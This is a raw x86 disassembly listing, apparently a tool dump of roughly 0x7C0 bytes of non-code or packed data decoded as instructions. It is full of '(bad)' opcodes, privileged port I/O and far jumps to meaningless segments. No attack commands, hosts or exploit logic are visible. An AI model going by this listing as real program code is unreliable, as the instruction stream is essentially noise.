  420cf7:	xchg   ebp,eax
  420cf8:	iret   
  420cf9:	test   ebx,edx
  420cfb:	and    al,0xb3
  420cfd:	test   dl,bh
  420cff:	pushf  
  420d00:	lahf   
  420d01:	int3   
  420d02:	mov    esi,0xe6886696
  420d07:	fwait
  420d08:	sbb    BYTE PTR [ebx],bl
  420d0a:	jge    0x420d02
  420d0c:	addr16 jge 0x420d89
  420d0f:	repnz and BYTE PTR [ebx-0x43a73fe8],ah
  420d16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d17:	repz pop ds
  420d19:	stos   BYTE PTR es:[edi],al
  420d1a:	sub    DWORD PTR [ecx],esi
  420d1c:	inc    edi
  420d1d:	inc    ebx
  420d1e:	xchg   ebp,eax
  420d1f:	jl     0x420d8d
  420d21:	sbb    BYTE PTR [ecx+0x1e],bh
  420d24:	jbe    0x420d8e
  420d26:	js     0x420ce9
  420d28:	std    
  420d29:	js     0x420d2e
  420d2b:	dec    ebp
  420d2c:	int    0xc1
  420d2e:	mov    esi,0x7b788d4a
  420d33:	or     al,0xfa
  420d35:	fwait
  420d36:	dec    ebp
  420d37:	loopne 0x420ccf
  420d39:	lahf   
  420d3a:	pop    es
  420d3b:	lods   eax,DWORD PTR ds:[esi]
  420d3c:	sbb    bl,0xa3
  420d3f:	stos   BYTE PTR es:[edi],al
  420d40:	adc    DWORD PTR [eax],0x31952006
  420d46:	fistp  DWORD PTR [edx]
  420d48:	sbb    ch,bl
  420d4a:	pushf  
  420d4b:	push   esp
  420d4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d4d:	add    BYTE PTR [ecx-0x6868271a],bl
  420d53:	pop    ebx
  420d54:	sahf   
  420d55:	or     ebp,DWORD PTR [edx+eax*8-0x1]
  420d59:	add    DWORD PTR [eax+0x4d155cda],esp
  420d5f:	push   ebp
  420d60:	loop   0x420d09
  420d62:	test   eax,0x916baede
  420d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d68:	push   ebp
  420d69:	mov    bl,bl
  420d6b:	mov    edi,0x426b0cd5
  420d70:	popf   
  420d71:	mov    dh,BYTE PTR [ecx+0x3e]
  420d74:	repz pop edi
  420d76:	bnd jno 0x420db2
  420d79:	sbb    al,0x1
  420d7b:	xchg   esi,eax
  420d7c:	push   ds
  420d7d:	outs   dx,DWORD PTR es:[esi]
  420d7f:	test   dl,bl
  420d81:	or     DWORD PTR [esi+0x74],0x7
  420d85:	js     0x420d95
  420d87:	(bad)  
  420d88:	cmc    
  420d89:	and    al,0xa7
  420d8b:	(bad)  
  420d8d:	mov    cl,BYTE PTR [eax-0x3]
  420d90:	inc    edx
  420d91:	(bad)  
  420d93:	sub    al,0x82
  420d95:	cdq    
  420d96:	rcl    DWORD PTR [edx-0x1d],0x42
  420d9a:	je     0x420e17
  420d9c:	xchg   edx,eax
  420d9d:	push   edi
  420d9e:	popa   
  420d9f:	adc    eax,0x4b2afb79
  420da4:	not    DWORD PTR [ebx-0x2b]
  420da7:	sbb    eax,0x2bb7fa41
  420dac:	fbld   TBYTE PTR [edi-0x36]
  420daf:	popf   
  420db0:	rol    DWORD PTR [ecx+0xd],1
  420db3:	push   esi
  420db4:	ud1    esp,DWORD PTR [esi-0x4a0ce61]
  420dbb:	out    dx,eax
  420dbc:	push   ecx
  420dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420dbe:	cld    
  420dbf:	ds fs int 0xff
  420dc3:	outs   dx,BYTE PTR ss:[esi]
  420dc5:	popa   
  420dc6:	jp     0x420de3
  420dc8:	(bad)  
  420dc9:	jp     0x420e30
  420dcb:	icebp  
  420dcc:	mov    ah,0xea
  420dce:	sahf   
  420dcf:	cmp    dh,BYTE PTR ds:0x2b579913
  420dd5:	xchg   DWORD PTR ds:0xc86d053b,eax
  420ddb:	ins    BYTE PTR es:[edi],dx
  420ddc:	and    ah,bl
  420dde:	and    DWORD PTR [edi+0x37a1d697],0xffffffcb
  420de5:	cmp    al,0x80
  420de7:	fisttp WORD PTR [eax]
  420de9:	mov    esp,0x31549548
  420dee:	cld    
  420def:	mov    ah,0x30
  420df1:	scas   al,BYTE PTR es:[edi]
  420df2:	sub    eax,0xf4b8bfeb
  420df7:	jae    0x420dfc
  420df9:	sbb    edx,esp
  420dfb:	sub    ebp,DWORD PTR [edx+0x25075eb0]
  420e01:	pop    ebp
  420e02:	or     al,0xd4
  420e04:	nop
  420e05:	imul   edx,DWORD PTR [edi+0x467527bb],0xab90b53
  420e0f:	mov    al,0x9
  420e11:	push   esp
  420e12:	sti    
  420e13:	jno    0x420db1
  420e15:	dec    edi
  420e16:	push   0xffffffb7
  420e18:	mov    esp,DWORD PTR [eax]
  420e1a:	mov    ds:0x8affa9fc,al
  420e1f:	xchg   esp,eax
  420e20:	cmp    DWORD PTR [edx],ebx
  420e22:	out    dx,al
  420e23:	test   bl,al
  420e25:	fst    DWORD PTR [ebp+0x17376090]
  420e2b:	cwde   
  420e2c:	push   esp
  420e2d:	in     eax,dx
  420e2e:	mov    BYTE PTR [ebx-0x3039feab],bl
  420e34:	xchg   ebp,eax
  420e35:	shl    DWORD PTR [ecx+eiz*2+0x49],1
  420e39:	and    dh,BYTE PTR [esi]
  420e3b:	test   DWORD PTR [ebx+0x32],0x3341c382
  420e42:	mov    esp,0x3d356df5
  420e47:	sbb    DWORD PTR [esp+esi*4+0x60],0x45bf58ae
  420e4f:	push   esp
  420e50:	dec    edi
  420e51:	stos   DWORD PTR es:[edi],eax
  420e52:	test   eax,0xccff8124
  420e57:	std    
  420e58:	jns    0x420e94
  420e5a:	sbb    ebp,eax
  420e5c:	lds    edi,FWORD PTR [edi]
  420e5e:	cmp    eax,0x67d5058b
  420e63:	into   
  420e64:	ret    
  420e65:	jmp    DWORD PTR [ecx]
  420e67:	pop    ebp
  420e68:	mov    bh,cl
  420e6a:	xor    DWORD PTR [edx],esp
  420e6c:	mov    esi,0xfc984291
  420e71:	(bad)  
  420e72:	cmp    BYTE PTR [ecx+0x5c],ch
  420e75:	inc    esp
  420e76:	call   0x427:0x6eaec8e7
  420e7d:	test   al,0x6d
  420e7f:	in     al,dx
  420e80:	in     eax,0xa5
  420e82:	xor    ah,BYTE PTR [eax]
  420e84:	push   cs
  420e85:	out    0x6c,al
  420e87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e88:	outs   dx,DWORD PTR ds:[esi]
  420e89:	or     esp,DWORD PTR [esi-0x21]
  420e8c:	cmp    BYTE PTR [edx-0x5a],bh
  420e8f:	out    dx,eax
  420e90:	scas   eax,DWORD PTR es:[edi]
  420e91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e92:	sbb    cl,BYTE PTR [bp-0x73]
  420e96:	adc    al,0x8d
  420e98:	push   edi
  420e99:	je     0x420e49
  420e9b:	or     esi,DWORD PTR [edx]
  420e9d:	imul   edx,DWORD PTR [ecx],0xffffffb5
  420ea0:	(bad)  
  420ea1:	and    bl,BYTE PTR [esi+0x4e]
  420ea4:	adc    eax,0x24a29c04
  420ea9:	add    al,0x36
  420eab:	sub    al,0xba
  420ead:	push   cs
  420eae:	push   ss
  420eaf:	sbb    al,0x83
  420eb1:	adc    DWORD PTR [ecx-0x3],esi
  420eb4:	repnz cmp eax,0xea4e990b
  420eba:	mov    esi,0x7445ea71
  420ebf:	stos   DWORD PTR es:[edi],eax
  420ec0:	and    BYTE PTR [ebp-0x51],ah
  420ec3:	xor    esp,DWORD PTR [eax-0x32]
  420ec6:	xor    al,0x42
  420ec8:	lods   eax,DWORD PTR ds:[esi]
  420ec9:	(bad)  
  420eca:	loope  0x420e9e
  420ecc:	dec    edi
  420ecd:	fbstp  TBYTE PTR [ecx+ebp*4]
  420ed0:	out    dx,al
  420ed1:	ins    DWORD PTR es:[edi],dx
  420ed2:	cmc    
  420ed3:	shl    al,cl
  420ed5:	imul   edi,DWORD PTR [edi+0x7f84fe4a],0xe8002a71
  420edf:	cmp    DWORD PTR [eax-0x5],ecx
  420ee2:	sbb    DWORD PTR [ebp+0x7a],edi
  420ee5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ee6:	out    0xb6,eax
  420ee8:	sub    al,BYTE PTR [eax+0x7d]
  420eeb:	ins    BYTE PTR es:[edi],dx
  420eec:	sbb    BYTE PTR [edi+esi*2-0x19],ah
  420ef0:	ins    DWORD PTR es:[edi],dx
  420ef1:	push   0xffffff97
  420ef3:	in     al,0x1a
  420ef5:	shl    dl,1
  420ef7:	out    0xf5,al
  420ef9:	adc    cl,cl
  420efb:	inc    ecx
  420efc:	mov    edi,esi
  420efe:	mov    dl,0xff
  420f00:	jno    0x420f06
  420f02:	mov    BYTE PTR [eax+0x26b90595],al
  420f08:	mov    cl,0x8f
  420f0a:	dec    eax
  420f0b:	dec    edi
  420f0c:	mov    al,ds:0x2746aec
  420f11:	xchg   ecx,eax
  420f12:	cmp    eax,0x40abc30b
  420f17:	cs in  al,0xd2
  420f1a:	call   0x62a:0x5eb003c0
  420f21:	jbe    0x420f40
  420f23:	mov    ebx,0xa0029a4e
  420f28:	xor    BYTE PTR [ebx+0x56],0x21
  420f2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f2d:	pop    ss
  420f2e:	std    
  420f2f:	(bad)  
  420f30:	or     esp,DWORD PTR [esi+eax*8+0x423a9e61]
  420f37:	add    BYTE PTR [edi+0x1013841f],bl
  420f3d:	ins    BYTE PTR es:[edi],dx
  420f3e:	idiv   BYTE PTR [ecx+0x9]
  420f41:	pop    ss
  420f42:	mov    ds,esi
  420f44:	xchg   ebp,eax
  420f45:	in     eax,dx
  420f46:	fidiv  WORD PTR [ebp+0x65]
  420f49:	retf   0xc0c6
  420f4c:	(bad)  
  420f4d:	loopne 0x420f83
  420f4f:	out    0xab,eax
  420f51:	sti    
  420f52:	ret    
  420f53:	cld    
  420f54:	pop    edx
  420f55:	das    
  420f56:	jb     0x420fc8
  420f58:	mov    ebx,DWORD PTR [ecx+0x2a]
  420f5b:	mov    cl,0xd0
  420f5d:	add    al,0x6e
  420f5f:	ret    0xcee8
  420f62:	lahf   
  420f63:	fnstenv [ebx]
  420f65:	sbb    BYTE PTR [eax-0x22f33ab5],0x6c
  420f6c:	hlt    
  420f6d:	out    0xea,al
  420f6f:	cmp    dh,dl
  420f71:	mov    WORD PTR [eax-0x2023d047],ss
  420f77:	es and esi,ebp
  420f7a:	and    DWORD PTR [esi],ecx
  420f7c:	push   cs
  420f7d:	into   
  420f7e:	loopne 0x420fbd
  420f80:	jmp    0x5bcc:0x8b6d1741
  420f87:	(bad)  
  420f88:	(bad)  
  420f89:	mov    ebx,0xf6147a40
  420f8e:	repz sti 
  420f90:	and    dh,BYTE PTR [edx]
  420f92:	mov    es,WORD PTR [esi+0x7b105550]
  420f98:	into   
  420f99:	imul   edx,DWORD PTR [edi],0xffffffb2
  420f9c:	mov    BYTE PTR [edi],cl
  420f9e:	sbb    al,0x6
  420fa0:	mov    dl,0xc1
  420fa2:	mov    edx,0xfd3490c
  420fa7:	clc    
  420fa8:	jecxz  0x420f8a
  420faa:	gs fsub st,st(6)
  420fad:	shl    DWORD PTR [esi+0x267db445],1
  420fb3:	jb     0x42100f
  420fb5:	fs scas eax,DWORD PTR es:[edi]
  420fb7:	jp     0x420f4a
  420fb9:	(bad)  [esi]
  420fbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fbc:	pop    esi
  420fbd:	(bad)  [ecx-0x24f4c2bd]
  420fc3:	mov    ebp,?
  420fc5:	jle    0x421008
  420fc7:	gs (bad) 
  420fc9:	daa    
  420fca:	ret    
  420fcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fcc:	test   eax,0xce985c1f
  420fd1:	pop    esp
  420fd2:	jne    0x420f95
  420fd4:	adc    ah,BYTE PTR [ebp-0x62]
  420fd7:	cmc    
  420fd8:	inc    ebx
  420fd9:	mov    bh,0x87
  420fdb:	cmp    DWORD PTR [eax+0x586fc40a],esi
  420fe1:	jns    0x420fc8
  420fe3:	retf   0x962
  420fe6:	sti    
  420fe7:	int3   
  420fe8:	dec    ecx
  420fe9:	jae    0x420fe3
  420feb:	cmp    cl,BYTE PTR [esp+edi*4]
  420fee:	outs   dx,DWORD PTR ds:[esi]
  420fef:	cdq    
  420ff0:	mov    bh,0x69
  420ff2:	jle    0x420fe1
  420ff4:	mov    dh,0x72
  420ff6:	mov    bl,0x19
  420ff8:	out    dx,eax
  420ff9:	inc    ebp
  420ffa:	cs leave 
  420ffc:	cld    
  420ffd:	scas   eax,DWORD PTR es:[edi]
  420ffe:	xor    ecx,DWORD PTR [ecx+eiz*2]
  421001:	dec    esi
  421002:	test   eax,0x202f836d
  421007:	loop   0x42106f
  421009:	loope  0x42106b
  42100b:	(bad)
  42100e:	pop    esp
  42100f:	jne    0x421032
  421011:	repnz push ebx
  421013:	add    al,0x4f
  421015:	nop
  421016:	fnsave [esi-0x5e721dc6]
  42101c:	jb     0x421047
  42101e:	xchg   ebp,eax
  42101f:	bound  edi,QWORD PTR ds:0x46dc3204
  421025:	dec    ecx
  421026:	push   ds
  421027:	scas   al,BYTE PTR es:[edi]
  421028:	jo     0x42107b
  42102a:	xor    BYTE PTR [ebx+0x55c97201],cl
  421030:	push   ss
  421031:	outs   dx,BYTE PTR ds:[esi]
  421032:	xchg   esi,eax
  421033:	mov    ds:0x371ffec0,eax
  421038:	xchg   BYTE PTR [ebp+0x36],al
  42103b:	sbb    edi,edx
  42103d:	jbe    0x420fec
  42103f:	pop    ss
  421040:	ret    
  421041:	lea    edx,[esi+0x26637c01]
  421047:	mov    ebx,0x77971748
  42104c:	pop    edx
  42104d:	mov    al,0xaa
  42104f:	adc    BYTE PTR ds:0xfd866f07,al
  421055:	clc    
  421056:	dec    esi
  421057:	jne    0x420fe5
  421059:	dec    ebp
  42105a:	aad    0x1a
  42105c:	pop    eax
  42105d:	sar    edx,cl
  42105f:	push   esp
  421060:	(bad)  
  421061:	mov    eax,ebx
  421063:	xchg   ebp,eax
  421064:	fisubr WORD PTR [ebx-0x369c37f0]
  42106a:	mov    gs,WORD PTR [ecx-0x3c]
  42106d:	shl    edx,1
  42106f:	adc    eax,0x6d9e4c9d
  421074:	xor    ebp,DWORD PTR [ebx+0x5f64c846]
  42107a:	mov    eax,ds:0x21f80ed6
  42107f:	xor    DWORD PTR [edx+0x613c41b6],esp
  421085:	ins    BYTE PTR es:[edi],dx
  421086:	sub    al,0x94
  421088:	sbb    bh,dl
  42108a:	ds int3 
  42108c:	or     BYTE PTR [ebp+0x13],0xc6
  421090:	or     eax,0xb716cb1b
  421095:	xor    DWORD PTR [ebx],esp
  421097:	xchg   BYTE PTR [ecx+edx*4],ah
  42109a:	and    dl,ch
  42109c:	adc    BYTE PTR [ebx-0x37],ah
  42109f:	loop   0x4210c1
  4210a1:	sar    DWORD PTR [edx+0x53],cl
  4210a4:	inc    ebx
  4210a5:	rcr    bh,1
  4210a7:	repz sub DWORD PTR [ebp-0x2226cd54],edi
  4210ae:	(bad)  
  4210af:	(bad)  [edx]
  4210b1:	imul   al
  4210b3:	xor    BYTE PTR [ebx+0x21],0xf
  4210b7:	add    BYTE PTR [eax-0x4c],0xf0
  4210bb:	cmp    ch,0xc6
  4210be:	pushw  cs
  4210c0:	stc    
  4210c1:	mov    eax,ds:0xbf946fd9
  4210c6:	pop    edi
  4210c7:	pop    ecx
  4210c8:	lock nop
  4210ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210cb:	add    ebx,DWORD PTR [eax]
  4210cd:	or     ebx,0x523e8554
  4210d3:	or     BYTE PTR [edx+0x6810fa29],dl
  4210d9:	xor    ch,BYTE PTR [edi]
  4210db:	add    DWORD PTR [edx],eax
  4210dd:	xchg   DWORD PTR [esi-0x221311a8],eax
  4210e3:	rol    DWORD PTR [esi-0x2b],0xac
  4210e7:	setle  BYTE PTR [edx+0x70bc859f]
  4210ee:	dec    esi
  4210ef:	dec    edi
  4210f0:	ss call 0x9260:0x6e0a5b6e
  4210f8:	aad    0xa0
  4210fa:	xchg   DWORD PTR [edx],ebp
  4210fc:	(bad)  
  4210fd:	ss dec esi
  4210ff:	imul   ecx,DWORD PTR [edi+0x6a0442f9],0x3c
  421106:	or     dh,BYTE PTR [ebp-0x50902e0b]
  42110c:	mov    ecx,0x47498d79
  421111:	push   ecx
  421112:	jae    0x421104
  421114:	fiadd  DWORD PTR [esi+ebp*4-0x27b48115]
  42111b:	mov    cl,BYTE PTR cs:[ebx-0x48]
  42111f:	push   edi
  421120:	mov    eax,ds:0xb9c6465e
  421125:	retf   0x5646
  421128:	(bad)  
  421129:	ins    DWORD PTR es:[edi],dx
  42112a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42112b:	pop    ecx
  42112c:	inc    edx
  42112d:	(bad)  
  42112e:	xchg   ebp,eax
  42112f:	adc    BYTE PTR [ebp+ebp*1+0x2b],0xe4
  421134:	add    dh,bl
  421136:	cmp    al,0x98
  421138:	inc    esi
  421139:	pop    esi
  42113a:	aas    
  42113b:	sbb    BYTE PTR [edx+0x61cbf745],0x81
  421142:	jno    0x421126
  421144:	mov    ebp,0x94f68af3
  421149:	ins    DWORD PTR es:[edi],dx
  42114a:	mov    eax,ds:0x45ec023a
  42114f:	push   cs
  421150:	xor    eax,0xbd3d92e1
  421155:	sub    esi,edx
  421157:	jns    0x4211cd
  421159:	inc    edx
  42115a:	in     al,dx
  42115b:	repz out 0xa9,eax
  42115e:	and    al,0x74
  421160:	rol    esp,0x8d
  421163:	jnp    0x421195
  421165:	icebp  
  421166:	cmp    dl,al
  421168:	mov    ds:0xd59adffa,eax
  42116d:	imul   ebp,DWORD PTR [edi],0x35987664
  421173:	in     eax,dx
  421174:	popf   
  421175:	mov    dh,0xb9
  421177:	out    0x9,al
  421179:	hlt    
  42117a:	sar    ebp,0x18
  42117d:	push   0x85dc89c3
  421182:	xchg   ecx,eax
  421183:	lods   al,BYTE PTR ds:[esi]
  421184:	mov    esi,0x4d80b9e1
  421189:	dec    DWORD PTR [edx]
  42118b:	fs xor al,0x5f
  42118e:	jmp    0xcfb9:0xe4984f29
  421195:	xchg   eax,eax
  421197:	jns    0x4211b9
  421199:	xchg   esp,eax
  42119a:	xor    BYTE PTR [edx-0x29],ch
  42119d:	mov    ah,0x5d
  42119f:	jo     0x4211d4
  4211a1:	test   BYTE PTR [ecx],bh
  4211a3:	or     DWORD PTR [ebp+ecx*8-0x28],esi
  4211a7:	fadd   DWORD PTR [eax+0x40]
  4211aa:	cmp    al,0x7e
  4211ac:	push   edx
  4211ad:	inc    ecx
  4211ae:	pop    edi
  4211af:	dec    ebx
  4211b0:	push   0xffffffd1
  4211b2:	mov    edi,0x1d193cd9
  4211b7:	pushf  
  4211b8:	or     DWORD PTR [ebp-0x2],ecx
  4211bb:	sub    eax,0xa1a0882
  4211c0:	pop    ss
  4211c1:	mov    ebp,DWORD PTR [edi-0x244eb5a4]
  4211c7:	sbb    DWORD PTR [edx],edi
  4211c9:	adc    edi,edi
  4211cb:	mov    ah,0x26
  4211cd:	loop   0x421179
  4211cf:	retf   
  4211d0:	loopne 0x42118e
  4211d2:	pop    esi
  4211d3:	les    edx,FWORD PTR [ebp+edx*1+0xf]
  4211d7:	xchg   edi,eax
  4211d8:	sub    al,dl
  4211da:	or     BYTE PTR [ecx-0xcba01a],ch
  4211e0:	lahf   
  4211e1:	(bad)  
  4211e2:	mov    bl,0xa
  4211e4:	or     cl,al
  4211e6:	cli    
  4211e7:	inc    ebp
  4211e8:	out    dx,eax
  4211e9:	pop    esp
  4211ea:	jb     0x42122f
  4211ec:	retf   
  4211ed:	cmp    al,0x3a
  4211ef:	pushf  
  4211f0:	cld    
  4211f1:	out    0x16,al
  4211f3:	sbb    ebx,DWORD PTR [eax]
  4211f5:	sar    DWORD PTR [ebx-0x58],0xda
  4211f9:	repz fidiv WORD PTR [edx+0x6f]
  4211fd:	clc    
  4211fe:	in     al,dx
  4211ff:	frstor [ecx-0x449ee8de]
  421205:	std    
  421206:	leave  
  421207:	sub    eax,DWORD PTR [edi+0x388c1c2b]
  42120d:	call   0x80608730
  421212:	push   ds
  421213:	xchg   edx,eax
  421214:	and    al,BYTE PTR [ebx-0x2ea1804a]
  42121a:	mov    BYTE PTR [ebx-0x5f609b1c],dh
  421220:	es mov ebp,0x3dab5d55
  421226:	xor    al,0xf9
  421228:	or     al,0xfa
  42122a:	dec    edi
  42122b:	sahf   
  42122c:	into   
  42122d:	dec    ebx
  42122e:	xor    DWORD PTR [esi+0x2f],edi
  421231:	arpl   WORD PTR [ebx+eax*4-0x781534ca],di
  421238:	push   ss
  421239:	cdq    
  42123a:	data16 sbb BYTE PTR [ebx+0x1b4658f8],bl
  421241:	repnz cmc 
  421243:	jb     0x421215
  421245:	add    al,0x9d
  421247:	iret   
  421248:	jp     0x42128b
  42124a:	in     al,dx
  42124b:	aam    0xc9
  42124d:	push   cs
  42124e:	or     eax,0xa234b00c
  421253:	xor    al,0xbe
  421255:	jae    0x42123f
  421257:	addr16 xor ecx,edx
  42125a:	or     ecx,DWORD PTR [esi]
  42125c:	les    ebp,FWORD PTR [ecx+0x2d1e41e4]
  421262:	mov    esp,0x6fa1f1ad
  421267:	popf   
  421268:	pop    edi
  421269:	or     BYTE PTR [edx+0x68],bl
  42126c:	mov    ds:0x29c726f4,al
  421271:	adc    BYTE PTR [edi],cl
  421273:	iret   
  421274:	and    ah,0x12
  421277:	outs   dx,DWORD PTR ds:[esi]
  421278:	or     eax,0x2d11bd82
  42127d:	jge    0x42127f
  42127f:	inc    ecx
  421280:	xlat   BYTE PTR ds:[ebx]
  421281:	in     al,0x79
  421283:	daa    
  421284:	fiadd  DWORD PTR [eax-0x1d]
  421287:	push   edx
  421288:	cld    
  421289:	aad    0xad
  42128b:	mov    esi,0x81720ce1
  421290:	stc    
  421291:	xchg   esp,eax
  421292:	inc    edi
  421293:	add    edx,DWORD PTR [edi-0x77]
  421296:	dec    eax
  421297:	nop
  421298:	mov    WORD PTR [eax+0x3eedeb4],es
  42129e:	jp     0x4212d1
  4212a0:	mov    dh,0x60
  4212a2:	jo     0x42129f
  4212a4:	rol    DWORD PTR [eax+0x7cce6b98],1
  4212aa:	pushf  
  4212ab:	adc    ecx,esi
  4212ad:	out    0x89,eax
  4212af:	cmp    bl,BYTE PTR gs:[ebx+0x7e0ea03b]
  4212b6:	inc    ebp
  4212b7:	inc    BYTE PTR [edx+0x78964f96]
  4212bd:	cmc    
  4212be:	mov    ecx,0x295edbc2
  4212c3:	push   es
  4212c4:	push   esp
  4212c5:	daa    
  4212c6:	repnz jecxz 0x42124e
  4212c9:	lods   eax,DWORD PTR ds:[esi]
  4212ca:	(bad)  
  4212cb:	out    dx,al
  4212cc:	sbb    DWORD PTR [ebx-0x6e10748c],0x2f
  4212d3:	das    
  4212d4:	cmp    BYTE PTR [esi],bh
  4212d6:	test   eax,0x6ae04338
  4212db:	cmp    BYTE PTR [ebx+esi*4+0x7c],cl
  4212df:	sub    DWORD PTR [ebp-0x471dc1b2],esi
  4212e5:	jae    0x42128d
  4212e7:	out    dx,al
  4212e8:	fiadd  WORD PTR [ecx+eiz*1+0x46dd6283]
  4212ef:	or     esi,DWORD PTR [ecx+eax*4-0x60a855f3]
  4212f6:	mov    esi,0xd11fd356
  4212fb:	shl    ebp,cl
  4212fd:	pop    edi
  4212fe:	mov    ?,WORD PTR [edx]
  421300:	xlat   BYTE PTR ds:[ebx]
  421301:	adc    ecx,esp
  421303:	into   
  421304:	fcom   DWORD PTR [edx+0x5d24764d]
  42130a:	jmp    0x27ef:0x6ee9a73b
  421311:	sbb    ah,0x30
  421314:	ficomp WORD PTR [esi+ebp*4]
  421317:	cmp    bl,dl
  421319:	push   cs
  42131a:	ss leave 
  42131c:	push   edx
  42131d:	mov    dl,0x35
  42131f:	jae    0x4212c3
  421321:	mov    esp,0x3cad0380
  421326:	retf   0xa8fb
  421329:	sti    
  42132a:	ret    0xdb41
  42132d:	xchg   ebp,eax
  42132e:	rcr    BYTE PTR [esi-0x63a39172],cl
  421334:	enter  0x9911,0xd5
  421338:	addr16 mov ch,0xec
  42133b:	inc    ebx
  42133c:	inc    esi
  42133d:	dec    esp
  42133e:	jne    0x4212d0
  421340:	data16 mov cl,BYTE PTR [ebx]
  421343:	pop    ss
  421344:	in     al,0x1a
  421346:	out    dx,eax
  421347:	fild   QWORD PTR [eax+0x4ec056ef]
  42134d:	sub    DWORD PTR [ecx-0x5f],esi
  421350:	ja     0x421368
  421352:	mov    edx,0x71b0b541
  421357:	pop    esi
  421358:	jbe    0x42134a
  42135a:	std    
  42135b:	add    DWORD PTR [eax-0x57],ebp
  42135e:	cmp    eax,0x35fe2a1
  421363:	rcl    BYTE PTR [ebp+0x5355dcb9],cl
  421369:	sbb    BYTE PTR [ecx-0x2a],dh
  42136c:	push   ecx
  42136d:	je     0x421372
  42136f:	jecxz  0x4213bd
  421371:	adc    edi,DWORD PTR [eax]
  421373:	jl     0x421338
  421375:	lods   eax,DWORD PTR ds:[esi]
  421376:	fcom   st(7)
  421378:	mov    ds:0x12694d5,eax
  42137d:	hlt    
  42137e:	push   0xfd47c267
  421383:	repnz mov bl,BYTE PTR [edi+0x55]
  421387:	inc    esi
  421388:	sub    DWORD PTR [esp+edi*8],esi
  42138b:	cmp    cl,BYTE PTR [esi-0x4801d2cc]
  421391:	sbb    esp,edx
  421393:	jb     0x4213a7
  421395:	pushf  
  421396:	inc    ebp
  421397:	arpl   bp,di
  421399:	das    
  42139a:	push   ss
  42139b:	lahf   
  42139c:	mov    al,0x88
  42139e:	mov    edx,0xdaaaa6a4
  4213a3:	mov    ds:0x3ccc0fe9,al
  4213a8:	popf   
  4213a9:	jl     0x4213d8
  4213ab:	aaa    
  4213ac:	imul   BYTE PTR [ebx-0x2b63cad8]
  4213b2:	rcr    ah,1
  4213b4:	and    edx,DWORD PTR ds:0x8360ab4f
  4213ba:	outs   dx,BYTE PTR ds:[esi]
  4213bb:	mov    esp,0x1f08271
  4213c0:	aaa    
  4213c1:	aam    0x7d
  4213c3:	shl    dl,0x75
  4213c6:	jmp    0x421412
  4213c8:	inc    esi
  4213c9:	mov    esp,0x47e068d3
  4213ce:	out    dx,al
  4213cf:	mov    edi,0x9e530aaf
  4213d4:	ficom  WORD PTR es:[esi]
  4213d7:	inc    esi
  4213d8:	inc    esp
  4213d9:	test   DWORD PTR [edi+eiz*1-0x37],esp
  4213dd:	call   DWORD PTR [edx]
  4213df:	xchg   edi,eax
  4213e0:	mov    bh,0x67
  4213e2:	jbe    0x421456
  4213e4:	aam    0xb6
  4213e6:	(bad)  
  4213e7:	dec    BYTE PTR [edi-0x4beaf550]
  4213ed:	sub    eax,0x721c9fc0
  4213f2:	arpl   di,bp
  4213f4:	mov    bl,0xe3
  4213f6:	mov    bl,0xb4
  4213f8:	jle    0x4213dd
  4213fa:	xor    al,0x14
  4213fc:	jmp    0x421472
  4213fe:	test   DWORD PTR ds:0x9e3f176d,ebp
  421404:	cdq    
  421405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421406:	sahf   
  421407:	xlat   BYTE PTR ds:[ebx]
  421408:	xlat   BYTE PTR ds:[ebx]
  421409:	push   edx
  42140a:	test   DWORD PTR [ecx+eax*1+0x8],ebx
  42140e:	mov    ds:0x65125556,al
  421413:	pop    es
  421414:	jmp    0x4213d3
  421416:	out    dx,eax
  421417:	mov    esp,0xd972bce8
  42141c:	sub    eax,0xa8780d5d
  421421:	push   edi
  421422:	mov    fs,ebp
  421424:	or     edi,ebx
  421426:	pop    ds
  421427:	bound  ebp,QWORD PTR [ebx-0x1c]
  42142a:	jae    0x4214a2
  42142c:	push   ebp
  42142d:	inc    esp
  42142e:	pushf  
  42142f:	push   esp
  421430:	jmp    0xa61a:0xe3d6e877
  421437:	ds jg  0x4214b6
  42143a:	rcl    BYTE PTR [esi+0x67bc7dad],0x3
  421441:	xchg   edi,eax
  421442:	sub    DWORD PTR [edx],esi
  421444:	push   eax
  421445:	push   ebp
  421446:	push   es
  421447:	add    BYTE PTR ds:0xeca5f2bb,dl
  42144d:	sti    
  42144e:	stos   DWORD PTR es:[edi],eax
  42144f:	push   eax
  421450:	scas   al,BYTE PTR es:[edi]
  421451:	mov    ch,0xae
  421453:	mov    ebp,0xec5947f9
  421458:	(bad)  
  42145a:	cmp    dh,BYTE PTR [eax+0x18f9101]
  421460:	adc    bl,BYTE PTR [eax-0x41]
  421463:	mov    esp,0xeaa673e4
  421468:	data16 aaa 
  42146a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42146b:	dec    ebp
  42146c:	inc    ebx
  42146d:	mov    bl,0x4a
  42146f:	cmp    bl,BYTE PTR [eax-0x378756c1]
  421475:	cmc    
  421476:	test   DWORD PTR [edx-0x30dcee1b],ecx
  42147c:	retf   0x5203
  42147f:	mov    dh,0x89
  421481:	or     ebx,eax
  421483:	xor    BYTE PTR [ecx],dl
  421485:	and    DWORD PTR [ebx+0x42],esi
  421488:	mov    esp,0x99040dd8
  42148d:	cli    
  42148e:	inc    ebp
  42148f:	js     0x4214f0
  421491:	mov    cl,0x33
  421493:	push   0x5db37b5f
  421498:	dec    edi
  421499:	xor    eax,0x39b54b31
  42149e:	mov    al,ds:0x9384b17a
  4214a3:	mov    al,ds:0x526a55
  4214a8:	(bad)  [edx+0x76f8b75c]
  4214ae:	xor    al,0x29
  4214b0:	arpl   WORD PTR [eax],cx
  4214b2:	test   DWORD PTR [esi+0x79],esi
  4214b5:	ret    
  4214b6:	push   eax
  4214b7:	outs   dx,BYTE PTR ds:[esi]
